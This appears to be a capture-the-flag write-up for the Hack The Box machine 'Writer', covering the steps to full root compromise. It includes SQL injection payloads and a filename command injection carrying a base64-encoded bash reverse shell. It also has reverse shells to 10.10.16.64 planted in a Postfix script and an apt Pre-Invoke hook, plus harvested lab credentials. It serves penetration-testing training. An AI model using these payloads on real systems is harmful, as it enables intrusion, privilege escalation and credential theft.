> Author: **[TheCyberGeek][author-profile]**

## Initial discovery

### Services

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
```

```bash
137/udp open          netbios-ns  Samba nmbd netbios-ns (workgroup: WORKGROUP)
138/udp open|filtered netbios-dgm
Service Info: Host: WRITER
```

### Web directories

```bash
/contact              (Status: 200) [Size: 4905]
/logout               (Status: 302) [Size: 208] [--> http://10.10.11.101/]
/about                (Status: 200) [Size: 3522]
/static               (Status: 301) [Size: 313] [--> http://10.10.11.101/static/]
/dashboard            (Status: 302) [Size: 208] [--> http://10.10.11.101/]
/server-status        (Status: 403) [Size: 277]
/administrative       (Status: 200) [Size: 1443]
```

### SMB

```bash
sudo nbtscan -r 10.10.11.101
# IP address       NetBIOS Name     Server    User             MAC address
# ------------------------------------------------------------------------------
# 10.10.11.101     WRITER           <server>  WRITER           00:00:00:00:00:00
```

```bash
# [*] 10.10.11.101:445      - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{74697277-7265-0000-0000-000000000000}) (authentication domain:WRITER)
```

```bash
smbclient --no-pass -L //10.10.11.101
#   Sharename       Type      Comment
#   ---------       ----      -------
#   print$          Disk      Printer Drivers
#   writer2_project Disk
#   IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))
```

```bash
enum4linux -a 10.10.11.101
# index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: kyle Name: Kyle Travis   Desc:
# user:[kyle] rid:[0x3e8]
# S-1-5-21-1663171886-1921258872-720408159-501 WRITER\nobody (Local User)
# S-1-5-21-1663171886-1921258872-720408159-513 WRITER\None (Domain Group)
# S-1-5-21-1663171886-1921258872-720408159-1000 WRITER\kyle (Local User)
# S-1-22-1-1000 Unix User\kyle (Local User)
# S-1-22-1-1001 Unix User\john (Local User)
# S-1-5-32-544 BUILTIN\Administrators (Local Group)
# S-1-5-32-545 BUILTIN\Users (Local Group)
# S-1-5-32-546 BUILTIN\Guests (Local Group)
# S-1-5-32-547 BUILTIN\Power Users (Local Group)
# S-1-5-32-548 BUILTIN\Account Operators (Local Group)
# S-1-5-32-549 BUILTIN\Server Operators (Local Group)
# S-1-5-32-550 BUILTIN\Print Operators (Local Group)
```

We get a list of shares and local users:

```
kyle
john
nobody
```

### Manual inspection

There are a few more informations to gather from the page source & content:

- the fontend uses Boostrap
- the server side has elements from WooCommerce?
- creation date: around `2021-05-17 21:57:04`
- the directories under `http://10.10.11.101/static/` can be browsed

The contact form doesn't trigger any request.

The authors of the blog posts may have accounts:

```
Yolanda Wu
Nina Chyll
Catherine Hill
Evelyn Kill
Christina Marie
R.A
Shawn Forno
```

## Login on the

Testing the `administrative` page by hand, the standard SQLi works:

```
uname=admin%27+OR+1%3D%271&password=PASS
```

![][sqli]

Still, the SQLi testing can be automated with:

```bash
ffuf -X POST -request fuzzing.req \
    -w /usr/share/wordlists/fuzzing/MySQL-SQLi-Login-Bypass.fuzzdb.txt:UNAME \
    -w /usr/share/wordlists/fuzzing/MySQL-SQLi-Login-Bypass.fuzzdb.txt:PASS \
    -t 200 -c -mode pitchfork -mc all -request-proto http
# [Status: 200, Size: 808, Words: 3, Lines: 6, Duration: 136ms]
#     * UNAME: 'OR 1=1--
#     * PASS: 'OR 1=1--
# [Status: 200, Size: 808, Words: 3, Lines: 6, Duration: 138ms]
#     * PASS: ' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
#     * UNAME: ' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
# [Status: 200, Size: 808, Words: 3, Lines: 6, Duration: 161ms]
#     * UNAME: <username>' OR 1=1--
#     * PASS: <username>' OR 1=1--
# [Status: 200, Size: 808, Words: 3, Lines: 6, Duration: 164ms]
#     * UNAME: 'OR '' = ' Allows authentication without a valid username.
#     * PASS: 'OR '' = '  Allows authentication without a valid username.
# [Status: 200, Size: 808, Words: 3, Lines: 6, Duration: 186ms]
#     * UNAME: <username>'--
#     * PASS: <username>'--
```

This allows to bypass the login page and gain admin privileges in the web interface.

From the dashboard, it's possible to edit the stories and list the users.
Code / file injection doesn't work here.

The `/dashboard/users` page loads node modules:

```
http://10.10.11.101/vendor/node_modules/popper.js/dist/esm/popper.js
```

## Reading local files

### Crafting a SQL query

```bash
sqlmap -v 2 -u http://10.10.11.101/administrative \
    --dbms mysql --technique=U --answer="redirect=N" --data "uname=&password=" \
    --level 5 --risk 3 --time-sec 2 --batch
# Parameter: uname (POST)
#     Type: boolean-based blind
#     Title: OR boolean-based blind - WHERE or HAVING clause
#     Payload: uname=-5492' OR 4671=4671-- nLCS&password=
#     Vector: OR [INFERENCE]

#     Type: time-based blind
#     Title: MySQL < 5.0.12 OR time-based blind (heavy query)
#     Payload: uname=' OR 4650=BENCHMARK(5000000,MD5(0x53525154))-- xubL&password=
#     Vector: OR [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])

#     Type: UNION query
#     Title: Generic UNION query (NULL) - 6 columns
#     Payload: uname=' UNION ALL SELECT NULL,CONCAT(0x7170627171,0x6f6f5a77655a74415a4a4e4248627a43456563765a647a724557485675616c6d7244435465646777,0x71706a6b71),NULL,NULL,NULL,NULL-- -&password=
#     Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL-- -
# web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal)
# web application technology: Apache 2.4.41
# back-end DBMS: MySQL < 5.0.12
```

The attacks from SqlMap fail to load the schema or dump any data.

May-be we can go further and adapt its payloads. First catch the request from
SqlMap in Burp Suite:

```bash
sqlmap -v 2 -u http://10.10.11.101/administrative \
    --dbms mysql --technique=U --answer="redirect=N" --data "uname=&password=" \
    --level 5 --risk 3 --time-sec 2 --batch --proxy=127.0.0.1:8080
```

```javascript
decodeURIComponent('%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7170627171%2C%28CASE%20WHEN%20%280x57%3DUPPER%28MID%28%40%40version_compile_os%2C1%2C1%29%29%29%20THEN%201%20ELSE%200%20END%29%2C0x71706a6b71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-')
// "' UNION ALL SELECT NULL,CONCAT(0x7170627171,(CASE WHEN (0x57=UPPER(MID(@@version_compile_os,1,1))) THEN 1 ELSE 0 END),0x71706a6b71),NULL,NULL,NULL,NULL-- -"
decodeURIComponent('-8529%27%20OR%20ORD%28MID%28%28IFNULL%28CAST%28HEX%28LOAD_FILE%280x2f6574632f706173737764%29%29%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C1%29%29%3E52--%20KixB')
// "-8529' OR ORD(MID((IFNULL(CAST(HEX(LOAD_FILE(0x2f6574632f706173737764)) AS NCHAR),0x20)),1,1))>52-- KixB"
hex2a('2f6574632f706173737764')
// "/etc/passwd"
```

Then combine both query into a new union statement, because it's faster than
the boolean blind payload. Starting simple:

```sql
UNION ALL SELECT NULL,LOAD_FILE(0x2f6574632f706173737764),NULL,NULL,NULL,NULL-- -
```

The expected result is the file `/etc/passwd`.

### Sending the SQLi payload

Back in Burp Suite, we capture a random request to the admin page and send it
to the repeater. Then edit the data to match:

```
uname=%27%20UNION%20ALL%20SELECT%20NULL%2CLOAD_FILE(0x2f6574632f706173737764)%2CNULL%2CNULL%2CNULL%2CNULL--%20-&passwd=
```

It works! The most interesting entries of `/etc/passwd` are:

```
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
```

### Extracting the source code

#### Apache configuration

So the root folder of the website is `/var/www`. We've already found that the
server is Apache, let's try and upload its site settings:

```python
bytes('/etc/apache2/sites-available/000-default.conf', 'utf-8').hex()
# '2f6574632f617061636865322f73697465732d617661696c61626c652f3030302d64656661756c742e636f6e66'
```

```
Welcome # Virtual host configuration for writer.htb domain
<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <Directory /var/www/writer.htb>
                Order allow,deny
                Allow from all
        </Directory>
        Alias /static /var/www/writer.htb/writer/static
        <Directory /var/www/writer.htb/writer/static/>
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

#### Flask init

Following the trail with `/var/www/writer.htb/writer.wsgi`:

```python
# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,'/var/www/writer.htb/')

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get('SECRET_KEY', '')
```

This scripts treats the subfolder `writer` as a module: it has an `__init__`
script. Let's get it!

The file is huge:

```bash
wc -l sources/__init__.py
# 295 sources/__init__.py
```

Which works in our advantage, it may be the last file we download manually.

Indeed it pays off:

```python
connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
```

The page `dashboard/users` receives all the data from the database:

```python
@app.route('/dashboard/users')
def users():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('users.html', results=results)
```

And the template leaves the password out of the displayed values:

```html
{% for result in results %}
<tr>
    <td>{{ result[0] }}</td>
    <td>{{ result[1] }}</td>
    <td>{{ result[3] }}</td>
    <td>{{ result[5] }}</td>
    <td>{{ result[4] }}</td>
</tr>
{% endfor %}
```

So we could get the admin password by rewritting the template and adding the
missing `<td>{{ result[2] }}</td>`.

But that's a lot of work for a password with unknown authorizations.

The real highlight of the script is:

```python
local_filename, headers = urllib.request.urlretrieve(image_url)
os.system("mv {} {}.jpg".format(local_filename, local_filename))
```

## Login as www-data

So the name of a file can be interpreted as a system command. The challenge is
to create a valid filename made of shell commands. Base64 encoding escapes most
of the special characters:

```bash
# YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NC85ODc2IDA+JjEn
payload=$(echo -n "bash -c 'bash -i >& /dev/tcp/10.10.16.64/9876 0>&1'" | base64 -w 0)
touch "1.jpg;\`echo ${payload}|base64 -d|bash\`;"
```

The file has to actually exist on the server for the call `urllib.request.urlretrieve`
to return. So we upload the empty file first, as a header for an existing story:

![][upload-image]

And check `http://writer.htb/static/img`:

![][check-payload]

Next, we submit the form a second time, with the url of the image we just uploaded:

![][trigger-payload]

Upgrade the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
# Ctrl + z
stty echo -raw
fg
```

## Login as kyle

Browsing the source directory, we find a development folder: `/var/www/writer2_project`.

```python
SECRET_KEY = 'q2!1iwm^9jlx@4u66k(ke!_=(5uacvl@%%(g&6=$$m1u5n=*4-'
```

```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'OPTIONS': {
            'read_default_file': '/etc/mysql/my.cnf',
        },
    }
}
```

```bash
cat /etc/mysql/my.cnf
# !includedir /etc/mysql/conf.d/
# !includedir /etc/mysql/mariadb.conf.d/

# [client]
# database = dev
# user = djangouser
# password = DjangoSuperPassword
```

I missed the last lines at first: my reverse shell didn't have enough lines
to display it in vim... Make sure to adjust the number of rows and columns of
the reverse shell:

```bash
# stty -a
stty rows 82 columns 174
```

Anyway, on with the hunt:

```bash
mysql -D'writer' -u'admin' -p'ToughPasswordToCrack' -e'show tables;'
mysql -D'writer' -u'admin' -p'ToughPasswordToCrack' -e'select username, password from users;'
# +----------+----------------------------------+
# | username | password                         |
# +----------+----------------------------------+
# | admin    | 118e48794631a9612484ca8b55f622d0 |
# +----------+----------------------------------+
```

Not great. Next is the Django database:

```bash
mysql -h'127.0.0.1' -D'dev' -u'djangouser' -p'DjangoSuperPassword' -e'show tables;'
mysql -h'127.0.0.1' -D'dev' -u'djangouser' -p'DjangoSuperPassword' -e'select * from auth_user;'
# +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
# |  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
# +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
```

There we go! Crack it:

```bash
# hashcat --help | grep -ia django
hashcat -a 0 -m 10000 kyle.hash /usr/share/wordlists/passwords/rockyou.txt
```

> marcoantonio

## Kyle to John

```bash
sudo -l
# Sorry, user kyle may not run sudo on writer.
groups
# kyle filter smbgroup
find / -type f \( -group smbgroup -o -group filter \) 2>/dev/null
# /etc/postfix/disclaimer
```

Ok, I'm completely clueless when it comes to SMTP & Postfix:
time for [more googling][hacktricks-smtp].

If I bought Hacktricks a coffee everytime I'd be broke! As usual it delivers:
the script `/etc/postfix/disclaimer` is executed when a user receives mail.

Obviously we want it to execute a reverse shell, we add it at the top. Since
the file is regularly reset, we'll automate the process':

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.16.64/9876 0>&1'" |
    cat - /etc/postfix/disclaimer > disclaimer
```

Then execute one of the following scripts to send a mail:

```bash
cp disclaimer /etc/postfix/disclaimer
sendmail -vt < ~/mail.txt
```

```bash
cp disclaimer /etc/postfix/disclaimer
curl -k --url 'smtp://127.0.0.1:25' \
    --mail-from 'kyle@writer.htb' --mail-rcpt 'john@writer.htb' \
    --upload-file mail.txt
```

```bash
cp disclaimer /etc/postfix/disclaimer && python3 mail.py
cat mail.py
# import smtplib

# try:
#     server = smtplib.SMTP('127.0.0.1', 25)
#     server.ehlo()
#     server.sendmail("kyle@writer.htb", "john@writer.htb", """Subject: heyhey\n\noops""")
# except Exception as e:
#     print(e)
# finally:
#     server.quit()
```

## Escalation

```bash
groups
# john management
find / -type f \( -group john -o -group management \) \( -path /sys -o -path /proc \) -prune 2>/dev/null
# /etc/apt/apt.conf.d
```

A straight vector:

```bash
cat /etc/apt/apt.conf.d/15update-stamp
# APT::Update::Post-Invoke-Success {"touch /var/lib/apt/periodic/update-success-stamp 2>/dev/null || true";};
cat /etc/apt/apt.conf.d/20packagekit
# DPkg::Post-Invoke {
# "/usr/bin/test -e /usr/share/dbus-1/system-services/org.freedesktop.PackageKit.service && /usr/bin/test -S /var/run/dbus/system_bus_socket && /usr/bin/gdbus call --system --dest org.freedesktop.PackageKit --object-path /org/freedesktop/PackageKit --timeout 4 --method org.freedesktop.PackageKit.StateHasChanged cache-update > /dev/null; /bin/echo > /dev/null";
# };

# // When Apt's cache is updated (i.e. apt-cache update)
# APT::Update::Post-Invoke-Success {
# "/usr/bin/test -e /usr/share/dbus-1/system-services/org.freedesktop.PackageKit.service && /usr/bin/test -S /var/run/dbus/system_bus_socket && /usr/bin/gdbus call --system --dest org.freedesktop.PackageKit --object-path /org/freedesktop/PackageKit --timeout 4 --method org.freedesktop.PackageKit.StateHasChanged cache-update > /dev/null; /bin/echo > /dev/null";
# };
cat /etc/apt/apt.conf.d/50command-not-found
# # Refresh AppStream cache when APT's cache is updated (i.e. apt update)
# APT::Update::Post-Invoke-Success {
#     "if /usr/bin/test -w /var/lib/command-not-found/ -a -e /usr/lib/cnf-update-db; then /usr/lib/cnf-update-db > /dev/null; fi";
# };
```

John doesn't have permission to update the repository, but there's a background
job running:

```bash
apt update
# Reading package lists... Done
# E: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
ps -auxf | grep -ai apt
# root        5812  0.0  0.0   2608   604 ?        Ss   06:28   0:00      \_ /bin/sh -c /usr/bin/apt-get update
# root        5818  0.0  0.2  16204  8756 ?        S    06:28   0:00          \_ /usr/bin/apt-get update
# _apt        5824  0.0  0.2  21076  9592 ?        S    06:28   0:00              \_ /usr/lib/apt/methods/http
```

So we poison the apt update process with:

```bash
# test the vector
echo "APT::Update::Pre-Invoke {\"touch /home/john/heyhey\";};" > /etc/apt/apt.conf.d/00-default
# listen with: socat TCP-LISTEN:9876,reuseaddr FILE:`tty`,raw,echo=0
echo "APT::Update::Pre-Invoke {\"socat TCP4:10.10.16.64:9876 EXEC:bash,pty,stderr,setsid,sigint,sane\";};" > /etc/apt/apt.conf.d/00-default
```

And wait...

[author-profile]: https://app.hackthebox.eu/users/114053
[check-payload]: images/check-payload.png
[hacktricks-smtp]: https://book.hacktricks.xyz/pentesting/pentesting-smtp
[sqli]: images/sqli.png
[trigger-payload]: images/trigger-payload.png
[upload-image]: images/upload-image.png
